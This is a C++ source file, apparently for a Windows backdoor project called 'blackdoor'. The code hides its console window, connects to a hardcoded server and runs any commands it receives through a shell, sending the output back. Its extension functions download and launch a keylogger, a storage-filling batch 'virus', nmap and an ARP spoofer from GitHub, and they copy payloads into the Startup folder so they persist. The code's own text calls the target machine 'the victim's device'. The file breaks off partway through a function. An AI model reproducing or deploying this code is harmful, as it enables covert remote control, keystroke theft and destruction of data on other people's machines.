/** 
 * MIT License 
 *
 * Copyright 2017 s3q
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell 
 * copies of the Software, and to permit persons to whom the Software is 
 * furnished to do so, subject to the following conditions:
 
 * The above copyright notice and this permission notice shall be included in 
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE 
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE 
 * SOFTWARE.
 *
 * /////////////////////////////////////////////////////////////////////////////
 * 
 * Name: backdoor.cpp
 *
 * Description: 
 *
 * Sources:
 *   1. winbase.h header : https://docs.microsoft.com/en-us/windows/win32/api/winbase/
 *   2. unistd.h header: https://www.ibm.com/docs/en/aix/7.2?topic=files-unistdh-file
 *   3. ws2tcpip.h header : https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/
 *   4. fstream : https://www.cplusplus.com/reference/fstream/fstream/
 *   5. cstdlib : https://www.cplusplus.com/reference/cstdlib/
 
 *   6. WinMain function : https://docs.microsoft.com/en-us/windows/win32/learnwin32/winmain--the-application-entry-point 
 *   7. AllocConsole function : https://docs.microsoft.com/en-us/windows/console/allocconsole
 *   8. FindWindowA function : https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa
 *   9. ShowWindow function :  https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
 *   10. WSAStartup function : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
 *   11. ZeroMemory function : https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366920(v=vs.85)
 *   12. htons function :  https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htons
 *   13. recv function : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
 *   14. connect function : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
 *   15. send function : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send
 *   16. fgets function : https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/fgets-fgetws?view=msvc-160 
 *   8. 
 *   
 *
 * Notes:
 * 
 * 
*/

#ifdef _WIN32
#include <Windows.h>
#else
#include <unistd.h>
#endif
#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <unistd.h>
#include <cstdlib>

#pragma comment(lib, "ws2_32.lib")
using namespace std;

#define DEFAULT_BUFLEN 40690
#define DEFAULT_TOTALE_BUFLEN 651040
#define DEFAULT_PORT 27015

int sock;

/**
 * convert addition command to executable command 
*/
string Additions(char *buffer);
// Extensions Function:
string CE_InfoExt(string buffer);
string CE_RunExt(string buffer);
string CE_StartupExt(string buffer);
string CE_StopExt(string buffer);

/**
 * check if includes in string 
*/
int strincludes(char *strVar, char *buffer);

/**
 * slice string 
*/
char *strsub(char str[], int slice_from, int slice_to);

void download_file(char *filename);

/**
 * APIENTRY is an alias for WINAPI.
 * HWND is a "handle to a window" and is part of the Win32 API 
 * The LPSTR type and its alias PSTR specify a pointer to an array of 8-bit characters, which MAY be terminated by a null character.
*/
/**
 * Every Windows program includes an entry-point function that is named either WinMain or wWinMain. Here is the signature for wWinMain.
*/
int APIENTRY WinMain(
    /**
     * hInstance is something called a "handle to an instance" or "handle to a module." The operating system uses this value to identify the executable (EXE) when it is loaded in memory. 
     * The instance handle is needed for certain Windows functions—for example, to load icons or bitmaps.
    */
    HINSTANCE hInstance, 

    // hPrevInstance has no meaning. It was used in 16-bit Windows, but is now always zero.
    HINSTANCE hPrevInstance, 

    // pCmdLine contains the command-line arguments as a Unicode string.
    LPSTR pCmdLine, 
   
    // nCmdShow is a flag that says whether the main application window will be minimized, maximized, or shown normally.
    int nCmdShow)
{

    // handle to a window
    HWND stealth;

    /**
     * Allocates a new console for the calling process.
     * 
     * Return value :
     * If the function succeeds, the return value is nonzero.
     * 
     * moreinfo : https://docs.microsoft.com/en-us/windows/console/allocconsole
    */
    AllocConsole();

    /**
     * Retrieves a handle to the top-level window whose class name and window name match the specified strings. 
     * 
     * Parameters :
     * LPCSTR lpClassName -> The class name or a class atom created by a previous call to the RegisterClass or RegisterClassEx function. The atom must be in the low-order word of lpClassName; the high-order word must be zero.
     *                      If lpClassName is NULL, it finds any window whose title matches the lpWindowName parameter.
     * LPCSTR lpWindowName -> The window name (the window's title). If this parameter is NULL, all window names match.
     * 
     * Return value : HWND
     * If the function succeeds, the return value is a handle to the window that has the specified class name and window name.
     * If the function fails, the return value is NULL. To get extended error information, call GetLastError.
     *
     * Remarks :
     * If the lpWindowName parameter is not NULL, FindWindow calls the GetWindowText function to retrieve the window name for comparison.
     * 
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa
    */
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    /**
     * Sets the specified window's show state.
     *
     * Parameters :
     * HWND hWnd -> A handle to the window.
     * int nCmdShow -> Controls how the window is to be shown 
     * 
     * Return value : int
     *   - SW_HIDE -> 0 -> Hides the window and activates another window. 
     *   - SW_NORMAL -> 1 -> Activates and displays a window. If the window is minimized or maximized, the system restores it to its original size and position. An application should specify this flag when displaying the window for the first time.
     *   - SW_SHOWMINIMIZED -> 2 -> Activates the window and displays it as a minimized window.
     *   - ...
     *   - moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
     * Remarks :
     * To perform certain special effects when showing or hiding a window, use AnimateWindow.
    */
    ShowWindow(stealth, 0);

    /**
     * The sockaddr structure varies depending on the protocol selected. Except for the sin*_family parameter, sockaddr contents are expressed in network byte order.
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
    */
    sockaddr_in ServAdrr;
    char ServIp[16] = "192.168.1.36";

    /**
     * The WSADATA structure contains information about the Windows Sockets implementation.
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata
    */
    WSADATA wsaData;

    // if not initialzed successuflly : 
    if (
        /**
     * The WSAStartup function initiates use of the Winsock DLL by a process.
     
     * Parameters :
     * WORD wVersionRequired ->
     * LPWSADATA lpWSAData ->
     
     * Return value : int
     * If successful, the WSAStartup function returns zero. Otherwise, it returns one of the error codes listed below.  
     *   - WSASYSNOTREADY -> The underlying network subsystem is not ready for network communication.
     *   - WSAVERNOTSUPPORTED -> The version of Windows Sockets support requested is not provided by this particular Windows Sockets implementation.
     *   - WSAEINPROGRESS -> A blocking Windows Sockets 1.1 operation is in progress.
     *   - WSAEPROCLIM -> 	A limit on the number of tasks supported by the Windows Sockets implementation has been reached.
     *   - WSAEFAULT -> The lpWSAData parameter is not a valid pointer.
     * 
     * Remarks :
     * The WSAStartup function must be the first Windows Sockets function called by an application or DLL. It allows an application or DLL to specify the version of Windows Sockets required and retrieve details of the specific Windows Sockets implementation. The application or DLL can only issue further Windows Sockets functions after successfully calling WSAStartup.
     * 
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup 
    */
        WSAStartup(
            /**
         * Creates a WORD value by concatenating the specified values.
         * 
         * Parameters :
         * BYTE bLow -> The low-order byte of the new value.
         * BYTE bHigh -> The high-order byte of the new value.
         * 
         * Return value : WORD
         * The return value is a WORD value.
        */
            MAKEWORD(2, 0), &wsaData) != 0)
    {
        exit(1);
    }

// breack point for reconnecte to server :
tryc:

    /**
     * The socket function creates a socket that is bound to a specific transport service provider.
     * 
     * Parameters :
     * int af -> The address family specification : 
     *   - AF_UNSPEC -> 0 -> The address family is unspecified.
     *   - AF_INET -> 2 -> The Internet Protocol version 4 (IPv4) address family.
     *   - AF_IPX -> 6 -> The IPX/SPX address family.
     *   - AF_APPLETALK -> 16 -> The AppleTalk address family. This address family is only supported if the AppleTalk protocol is installed.
     *   - AF_NETBIOS -> 17 -> The NetBIOS address family. This address family is only supported if the Windows Sockets provider for NetBIOS is installed.
     *   - AF_INET6 -> 23 -> The Internet Protocol version 6 (IPv6) address family.
     *   - AF_IRDA -> 26 -> The Infrared Data Association (IrDA) address family.
     *   - AF_BTH -> 32 -> The Bluetooth address family.
     * int type -> The type specification for the new socket :
     *   - SOCK_STREAM -> 1 -> A socket type that provides sequenced
     *   - SOCK_DGRAM -> 2 -> A socket type that supports datagrams
     *   - SOCK_RAW -> 3 -> A socket type that provides a raw socket that allows an application to manipulate the next upper-layer protocol header
     *   - SOCK_RDM -> 4 -> A socket type that provides a reliable message datagram.
     *   - SOCK_SEQPACKET -> 5 -> A socket type that provides a pseudo-stream packet based on datagrams.
     * 
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket 
    */
    sock = socket(AF_INET, SOCK_STREAM, 0);

    /**
     * Fills a block of memory with zeros, for setting it empty
     * 
     * Parameters :
     * PVOID Destination -> A pointer to the starting address of the block of memory to fill with zeros.
     * SIZE_T Length -> The size of the block of memory to fill with zeros, in bytes.
    */
    ZeroMemory(&ServAdrr, sizeof(ServAdrr));

    // identification ServAdrr :
    ServAdrr.sin_family = AF_INET;
    ServAdrr.sin_addr.S_un.S_addr =
        /**
     * The inet_addr function converts a string containing an IPv4 dotted-decimal address into a proper address for the IN_ADDR structure.
     * 
     * Parameters :
     * const char *cp -> ip string
    */
        inet_addr(ServIp);

    ServAdrr.sin_port =
        /**
     * The htons function converts a u_short from host to TCP/IP network byte order (which is big-endian).
     * 
     * Parameters :
     * u_short hostshort -> A 16-bit number in host byte order.
     * 
     * Return value :
     * The htons function returns the value in TCP/IP network byte order.
    */
        htons(DEFAULT_PORT);

// try to connect to server if not connected until now :
start:

    /**
     * The connect function establishes a connection to a specified socket.
     * 
     * Parameters :
     * SOCKET s -> A descriptor identifying an unconnected socket. -> socket function
     * const sockaddr *name -> A pointer to the sockaddr structure to which the connection should be established.
     * int namelen -> The length, in bytes, of the sockaddr structure pointed to by the name parameter.
     * 
     * Return value :
     * If no error occurs, connect returns zero. Otherwise, it returns SOCKET_ERROR, and a specific error code can be retrieved by calling WSAGetLastError.
     *   - WSANOTINITIALISED -> A successful WSAStartup call must occur before using this function.
     *   - WSAENETDOWN -> A The network subsystem has failed.
     * 
     * Remarks : 
     * Until the connection attempt completes on a nonblocking socket, all subsequent calls to connect on the same socket will fail with the error code WSAEALREADY, and WSAEISCONN when the connection completes successfully. 
     * Due to ambiguities in version 1.1 of the Windows Sockets specification, error codes returned from connect while a connection is already pending may vary among implementations. As a result, it is not recommended that applications use multiple calls to connect to detect connection completion. 
     * If they do, they must be prepared to handle WSAEINVAL and WSAEWOULDBLOCK error values the same way that they handle WSAEALREADY, to assure robust operation.
     * 
     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
    */
    int resCon = connect(sock,
                         // The sockaddr structure varies depending on the protocol selected. Except for the sin*_family parameter, sockaddr contents are expressed in network byte order.
                         (struct sockaddr *)&ServAdrr, sizeof(ServAdrr));

    // if not connected :
    while (resCon != 0)
    {
        sleep(10);
        cout << "Try to connection " << endl;
        // try to connect to server again :
        goto start;
    }

    // if connection is established
    if (resCon == 0)
    {
        printf("[+] - Connected ^_^\n");
    }

    //  receives data ( command ) from a connected socket ( server )
    char buffer[DEFAULT_BUFLEN];
    // container is one line of response when execute the code, and add it to total_response
    char container[DEFAULT_BUFLEN];
    // total response of command which exexuted and will send it to connected socket ( server ) :
    char total_response[DEFAULT_TOTALE_BUFLEN];

    // cout << "[RECV]" << endl;

    while (true)
    {
    jumb:
        // Fills a block of memory with zeros, for setting it empty :
        ZeroMemory(buffer, sizeof(buffer));
        ZeroMemory(container, sizeof(container));
        ZeroMemory(total_response, sizeof(total_response));

        // int bytesRecv = recv(sock, buffer, sizeof(buffer), 0);
        /**
         * The recv function receives data from a connected socket or a bound connectionless socket.
         * 
         * Parameters :
         * SOCKET s -> The descriptor that identifies a connected socket. -> socket function 
         * char *buf -> A pointer to the buffer to receive the incoming data.
         * int len -> The length, in bytes, of the buffer pointed to by the buf parameter.
         * int flags -> A set of flags that influences the behavior of this function
         * 
         * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
         * 
         * Return value :
         * If no error occurs, recv returns the number of bytes received and the buffer pointed to by the buf parameter will contain this data received. 
         * If the connection has been gracefully closed, the return value is zero.
         *   - WSANOTINITIALISED - A successful WSAStartup call must occur before using this function.
         *   - WSAENETDOWN - The network subsystem has failed.
        */
        int bytesRecv = recv(sock, buffer, sizeof(buffer), 0);

        cout << "[CMD] - " << buffer << endl;

        // filed receives data ( error in socket ) : 
        if (bytesRecv == SOCKET_ERROR)
        {
            cerr << "[ERR] - Error in recv() ! . Quitting" << endl;
            // try to connect maybe the server is disconnected :
            goto tryc;
        }

        // The connection has been disconnected :
        if (bytesRecv == 0)
        {
            cout << "[ERR] - Server disconnected " << endl;
            // try to connect the server :
            goto tryc;
        }

        cout << "[CMD] - " << buffer << endl;

        // quit : close socket and exit : 
        if (strncmp("q", buffer, 1) == 0)
        {
            /**
             * The closesocket function closes an existing socket.
             * 
             * Paramters :
             * SOCKET s -> A descriptor identifying the socket to close.
             * 
             * Return value :
             * If no error occurs, closesocket returns zero. Otherwise, a value of SOCKET_ERROR is returned, and a specific error code can be retrieved by calling WSAGetLastError.
             * 
             * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-closesocket
            */
            closesocket(sock);

            /**
             * The WSACleanup function terminates use of the Winsock 2 DLL (Ws2_32.dll).
             * 
             * Return value :
             * The return value is zero if the operation was successful. Otherwise, the value SOCKET_ERROR is returned, and a specific error number can be retrieved by calling WSAGetLastError.
             * 
             * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsacleanup
            */
            WSACleanup();

            exit(0);
        }

        // change dir :  
        else if (strncmp("cd ", buffer, 3) == 0)
        {
            /**
             * Changes the current working directory.
             * 
             * Paramters :
             * const char *dirname
             * 
             * Return value : 
             * These functions return a value of 0 if successful. A return value of -1 indicates failure
            */
            chdir(strsub(buffer, 3, 100));

            /**
             * The send function sends data on a connected socket.
             * 
             * Paramters : 
             * SOCKET s -> A descriptor identifying a connected socket.
             * char *buf -> A pointer to a buffer containing the data to be transmitted.
             * int len -> The length, in bytes, of the data in buffer pointed to by the buf parameter.
             * int flags -> A set of flags that specify the way in which the call is made :
             *   - MSG_DONTROUTE -> Specifies that the data should not be subject to routing. A Windows Sockets service provider can choose to ignore this flag.
             *   - MSG_OOB -> Sends OOB data (stream-style socket such as SOCK_STREAM only.
             * 
             * Return value : 
             * If no error occurs, send returns the total number of bytes sent, which can be less than the number requested to be sent in the len parameter.
             * 
             *   - WSANOTINITIALISED - A successful WSAStartup call must occur before using this function.
             *   - WSAENETDOWN - The network subsystem has failed.
             * 
             * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send
            */
            send(sock, total_response, sizeof(total_response), 0);
        }
        else if (strncmp("download ", buffer, 9) == 0)
        {
            char *filename = strsub(buffer, 9, 100);
            // if (!filename) {

            // }
            // "@download -> file:filename.c; fdddddgfdgffddddddddddddhfghgf"
        }

        else
        {
            // set buffer to additions and custom commands if contained
            strcpy(buffer, Additions(buffer).c_str());

            /**
             * Creates a pipe and executes a command.
             * 
             * Paramters :
             * const char *command -> Command to be executed.
             * const char *mode -> Mode of the returned stream : 
             *   - r -> The calling process can read the spawned command's standard output using the returned stream.
             *   - w -> The calling process can write to the spawned command's standard input using the returned stream.
             *   - b -> Open in binary mode.
             *   - t -> Open in text mode.
             * 
             * moreinfo : https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/popen-wpopen?view=msvc-160
            */
            FILE *fp = _popen(buffer, "rt");

            /**
             * Get a string from a stream.
             * 
             * Paramters :
             * char *str -> Storage location for data.
             * int numChars -> Maximum number of characters to read.
             * FILE *stream -> Pointer to FILE structure.
             * 
             * Return value : 
             * Each of these functions returns str. NULL is returned to indicate an error or an end-of-file condition. 
             * Use feof or ferror to determine whether an error occurred.
             * 
             * moreinfo -> https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/fgets-fgetws?view=msvc-160
            */
            while (fgets(container, 4096, fp))
            {
                // add line of command ( container ) to total_response 
                strcat(total_response, container);
            }
            
            // when finish read all response comamnd : 
            if (feof(fp))
            {

                // send response command :
                send(sock, total_response, sizeof(total_response), 0);

                /**
                 * Waits for a new command processor and closes the stream on the associated pipe.
                 * 
                 * Paramters : 
                 * FILE *stream -> Return value from the previous call to _popen.
                 * 
                 * moreinfo : https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/pclose?view=msvc-160
                */
                _pclose(fp);
            }
        }
    }
}

// void download_file(char *filename)
// {

//     char lineData[DEFAULT_BUFLEN];
//     char fileData[DEFAULT_TOTALE_BUFLEN];
//     char response_err[DEFAULT_TOTALE_BUFLEN];

//     if (!filename)
//     {
//         strcpy(response_err, "please input valid filename");
//         send(sock, response_err, sizeof(response_err), 0);
//         return;
//     }

//     fstream fp;
//     fp.open(filename, ios::in);

//     while (fp >> lineData)
//     {
//         strcat(fileData, lineData);
//     }

//     send(sock, fileData, sizeof(fileData), 0);

//     return;
// }

string Additions(char *buffer)
{

    string obuf = buffer;

    if (obuf.find("apps_list ") != string::npos)
    {
        if (obuf.find("info") != string::npos)
        {
            obuf = "echo [APPLIST] [INFO] - This command allows you to view all the applications installed on the victim's device as well as those that are currently running";
        }
        else if (obuf.find("run") != string::npos)
        {
            if (obuf.find("all") != string::npos)
            {
                obuf = "powershell -Command \"Get-Process | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\"";
            }
            else
            {
                obuf = "powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle } | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\"";
            }
        }
        else if (obuf.find("all") != string::npos)
        {
            obuf = "powershell -Command \"Get-AppxPackage\"";
        }
    }
    else if (obuf.find("ext ") != string::npos)
    {
        if (obuf.find("info") != string::npos)
        {
            obuf = CE_InfoExt(obuf);
        }
        else if (obuf.find("run") != string::npos)
        {
            obuf = CE_RunExt(obuf);
        }
        else if (obuf.find("startup") != string::npos)
        {
            obuf = CE_StartupExt(obuf);
        }
        else if (obuf.find("stop") != string::npos)
        {
            obuf = CE_StopExt(obuf);
        }
    }
    return obuf;
}

/**
 * ######################################
 *            Extensions
 * ######################################
*/
string CE_InfoExt(string buffer)
{
    string ebuf = buffer;
    if (ebuf.find("keylog") != string::npos)
    {
        ebuf = "echo [EXT] [INFO] - This extension is built in C++ language and it logs all mouse and keyboard events and makes them available in C:\\ProgramData\\Ms\\log.txt file. And the keylogger.exe file is in C:\\ProgramData\\Ms All events will be added to the file cumulatively, you can delete it if you want to re-registration, or you can use the following command: $ ext reset keylog ";
        ebuf += " && echo. && echo [ $ ] - Available Commands : ";
        ebuf += " && echo [ $ ext run keylog ] -  for start recording ";
        ebuf += " && echo [ $ ext info keylog ] - show some info for keylog extension ";
        ebuf += " && echo [ $ ext reset keylog ] - delete keylog file :  C:\\ProgramData\\Ms\\log.txt ";
    }
    else if (ebuf.find("fill_storage") != string::npos)
    {
        ebuf = "echo [EXT] [INFO] - This extension is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device ";
        ebuf += " && echo. && echo [ $ ] - Available Commands : ";
        ebuf += " && echo [ $ ext run fill_storage ] -  for start fill storage ";
        ebuf += " && echo [ $ ext startup fill_storage ] - copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup ";
        ebuf += " && echo [ $ ext info fill_storage ] - show some info for fill_storage extension ";
    }
    else if (ebuf.find("nmap") != string::npos)
    {
        ebuf = "echo [EXT] [INFO] - This extension is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device ";
        ebuf += " && echo. && echo [ $ ] - Available Commands : ";
        ebuf += " && echo [ $ ext run nmap ] -  for download & make it ready for run ";
        ebuf += " && echo [ $ C:\\ProgramData\\Ms\\Nmap\\nmap ] -  for start nmap ";
        ebuf += " && echo [ $ ext info nmap ] - show some info for nmap extension ";
    }
    else if (ebuf.find("arp_spoof") != string::npos)
    {
        ebuf = "echo [EXT] [INFO] - This extension is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device ";
        ebuf += " && echo. && echo [ $ ] - Available Commands : ";
        ebuf += " && echo [ $ ext run arp_spoof ] -  for download and make it ready for run ";
        ebuf += " && echo [ $ C:\\ProgramData\\Ms\\arp_spoof\\arp_spoof.py ] -  for start arp_spoof ";
        ebuf += " && echo [ $ ext info arp_spoof ] - show some info for arp_spoof extension ";
    }
    else
    {
        ebuf = "echo [EXT] [INFO] - The extensions are based on multiple languages and different functions that achieve what the hacker wants to control the victim's device in a simple and fast way && echo Available extensions : && echo -- keylog && echo -- fill_storage && echo -- networks_profile && echo -- nmap && echo -- arp_spoof";
    }

    return ebuf;
}

string CE_RunExt(string buffer)
{
    string ebuf = buffer;

    string command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) ";
    string default_commad = command;

    if (ebuf.find("keylog") != string::npos)
    {
        command += " && echo. && echo [EXT] [DOWNLOAD] - keylogextension in C:\\ProgramData\\Ms\\keylogger.exe && echo [EXT] [RUN] - keylog extension .. && echo. ";
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) ";
    }
    if (ebuf.find("nmap") != string::npos)
    {
        command += " && echo. && echo [EXT] [DOWNLOAD] - Nmap extension in C:\\ProgramData\\Ms\\Nmap && echo [EXT] [RUN] - C:\\ProgramData\\Ms\\Nmap\\nmap && echo. ";
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/Nmap.zip -o C:\\ProgramData\\Ms\\Nmap.zip && IF EXIST C:\\ProgramData\\Ms\\Nmap.zip ( powershell -Command \"Expand-Archive -Path \"C:\\ProgramData\\Ms\\Nmap.zip\" -DestinationPath \"C:\\ProgramData\\Ms\"\" ) ELSE ( echo; ) ";
    }
    if (ebuf.find("arp_spoof") != string::npos)
    {
        command += " && echo. && echo [EXT] [DOWNLOAD] - arp_spoof extension in C:\\ProgramData\\Ms\\arp_spoof && echo [EXT] [RUN] - C:\\ProgramData\\Ms\\arp_spoof\\arp_spoof.py && echo.";
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/arp_spoof.zip -o C:\\ProgramData\\Ms\\arp_spoof.zip && IF EXIST C:\\ProgramData\\Ms\\arp_spoof.zip ( powershell -Command \"Expand-Archive -Path \"C:\\ProgramData\\Ms\\arp_spoof.zip\" -DestinationPath \"C:\\ProgramData\\Ms\"\" ) ELSE ( echo; ) ";
    }
    if (ebuf.find("networks_profile") != string::npos)
    {
        command += " && echo. && echo [EXT] [DOWNLOAD] - networks_profile extension in C:\\ProgramData\\Ms\\networks_profile.exe && echo [EXT] [RUN] - networks_profile extension .. && echo.";
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/networks_profile.exe -o C:\\ProgramData\\Ms\\networks_profile.exe && IF EXIST C:\\ProgramData\\Ms\\networks_profile.exe ( start C:\\ProgramData\\Ms\\networks_profile.exe ) ELSE ( echo; ) ";
    }
    if (ebuf.find("fill_storage") != string::npos)
    {
        command += " && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - fill_storage extension .. && echo.";
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) ";
    }
    if (ebuf.find("test_virus") != string::npos)
    {
        command += " && echo [EXT] [DOWNLOAD] - test [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - test_virus extension .. && echo.";

        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_move.bat -o C:\\ProgramData\\Ms\\test_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_virus.bat -o C:\\ProgramData\\Ms\\test_virus.bat ";
        if (ebuf.find("run") != string::npos)
        {
            command += " && IF EXIST C:\\ProgramData\\Ms\\test_move.bat ( start C:\\ProgramData\\Ms\\test_move.bat ) ELSE ( echo; ) ";
        }
    }

    if (default_commad == command)
    {
        ebuf = "echo [EXT] [ERR] - You must use a valid extension name !";
    }
    else
    {
        ebuf = command;
    }

    return ebuf;
}
//powershell -Command Expand-Archive -Path 'Nmap.zip' -DestinationPath '.'

string CE_StartupExt(string buffer)
{
    string ebuf = buffer;

    string command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) ";
    string default_commad = command;

    if (ebuf.find("keylog") != string::npos)
    {
        command += " && echo. && echo [EXT] [DOWNLOAD] - keylogextension in C:\\ProgramData\\Ms\\keylogger.exe && echo [EXT] [RUN] - keylog extension .. && echo. ";

        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\"";
        if (ebuf.find("run") != string::npos)
        {
            command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\" ) ELSE ( echo; ) ";
        }
    }
    else if (ebuf.find("fill_storage") != string::npos)
    {
        command += " && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - fill_storage extension .. && echo.";

        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_virus.bat\" ";
        if (ebuf.find("run") != string::npos)
        {
            command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ) ELSE ( echo; ) ";
        }
    }
    else if (ebuf.find("test_virus") != string::npos)
    {
        command += " && echo [EXT] [DOWNLOAD] - test [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - test_virus extension .. && echo.";

